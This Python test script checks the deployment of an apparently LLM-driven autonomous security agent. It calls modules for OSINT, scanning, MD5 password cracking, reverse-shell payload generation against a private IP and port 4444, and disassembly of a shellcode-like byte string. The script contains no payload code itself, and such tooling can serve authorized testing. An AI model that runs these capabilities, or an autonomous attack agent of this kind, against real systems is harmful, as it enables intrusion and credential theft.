#!/usr/bin/env python3

import sys
sys.path.append('/app/src')

from agent import LLMAutonomousAgent, LLMConfig
from tool_manager import create_default_tool_manager
from modules.osint_module import osint_search
from modules.network_module import network_scan
from modules.password_module import password_crack
from modules.analysis_module import code_analysis
from modules.exploit_module import generate_reverse_shell_payload, adapt_exploit_template
from modules.reverse_engineering_module import analyze_binary_snippet

def test_complete_deployment():
    print("=== Complete AI Security Tool Deployment Test ===")
    
    # Test 1: ToolManager with all modules
    print("\n1. Testing ToolManager with all registered modules:")
    tool_manager = create_default_tool_manager()
    tools = list(tool_manager.tools.keys())
    print(f"✅ Registered tools: {len(tools)}")
    print(f"   Tools: {tools}")
    
    # Test 2: Individual module functionality
    print("\n2. Testing individual module functionality:")
    
    # OSINT Module
    try:
        result = osint_search("example.com")
        print(f"✅ OSINT Module: {result['success']}")
    except Exception as e:
        print(f"❌ OSINT Module Error: {e}")
    
    # Network Module
    try:
        result = network_scan("127.0.0.1")
        print(f"✅ Network Module: {result['success']}")
    except Exception as e:
        print(f"❌ Network Module Error: {e}")
    
    # Password Module
    try:
        result = password_crack("5f4dcc3b5aa765d61d8327deb882cf99", "md5")
        print(f"✅ Password Module: {result['success']}")
    except Exception as e:
        print(f"❌ Password Module Error: {e}")
    
    # Analysis Module
    try:
        result = code_analysis("/app/test_code.py")
        print(f"✅ Analysis Module: {result['success']}")
    except Exception as e:
        print(f"❌ Analysis Module Error: {e}")
    
    # Exploit Module
    try:
        result = generate_reverse_shell_payload("192.168.1.100", 4444, "python")
        print(f"✅ Exploit Module: {result['success']}")
    except Exception as e:
        print(f"❌ Exploit Module Error: {e}")
    
    # Reverse Engineering Module
    try:
        test_binary = bytes.fromhex("31c048bbd19d9691d0c8b7b248b7b1c8b7b088b7b148b7b1029c989c8b0f05")
        result = analyze_binary_snippet(test_binary, "x86_64")
        print(f"✅ Reverse Engineering Module: {result['success']}")
    except Exception as e:
        print(f"❌ Reverse Engineering Module Error: {e}")
    
    # Test 3: Enhanced LLMAutonomousAgent
    print("\n3. Testing Enhanced LLMAutonomousAgent:")
    try:
        config = LLMConfig(
            api_endpoint="http://llm-service:8000/generate",
            api_key="test-key",
            model="gpt-3.5-turbo",
            max_tokens=1000,
            temperature=0.7
        )
        
        tool_manager = create_default_tool_manager()
        agent = LLMAutonomousAgent(config=config, tool_manager=tool_manager)
        
        print(f"✅ Agent initialized with {len(agent.memory)} memory entries")
        print(f"✅ Agent has {len(agent.tool_manager.tools)} tools available")
        
        # Test memory functionality
        agent.add_to_memory({
            "type": "test_observation",
            "content": "Deployment test observation",
            "metadata": {"test": True}
        })
        print(f"✅ Memory system working: {len(agent.memory)} entries")
        
        # Test plan generation
        plan_result = agent._generate_plan("Perform basic security analysis")
        print(f"✅ Plan generation: {plan_result['success']}")
        
    except Exception as e:
        print(f"❌ LLMAutonomousAgent Error: {e}")
    
    # Test 4: ToolManager execution
    print("\n4. Testing ToolManager execution:")
    try:
        result = tool_manager.execute_tool("osint_search", {"query": "test.com"})
        print(f"✅ ToolManager execution: {result.success}")
    except Exception as e:
        print(f"❌ ToolManager execution Error: {e}")
    
    # Test 5: LLM Service connectivity
    print("\n5. Testing LLM Service connectivity:")
    try:
        import requests
        response = requests.get("http://llm-service:8000/", timeout=5)
        if response.status_code == 200:
            print("✅ LLM Service: Connected and responsive")
        else:
            print(f"❌ LLM Service: HTTP {response.status_code}")
    except Exception as e:
        print(f"❌ LLM Service Error: {e}")
    
    # Test 6: System capabilities summary
    print("\n6. System Capabilities Summary:")
    capabilities = {
        "modules_loaded": len(tools),
        "memory_enabled": True,
        "planning_enabled": True,
        "llm_integration": True,
        "multi_architecture": True,
        "docker_containerized": True
    }
    
    for capability, status in capabilities.items():
        status_icon = "✅" if status else "❌"
        print(f"   {status_icon} {capability.replace('_', ' ').title()}")
    
    print(f"\n=== Deployment Test Complete ===")
    print(f"Total Tools Available: {len(tools)}")
    print(f"System Status: {'OPERATIONAL' if len(tools) >= 8 else 'PARTIAL'}")
    
    return len(tools) >= 8

if __name__ == "__main__":
    success = test_complete_deployment()
    sys.exit(0 if success else 1)
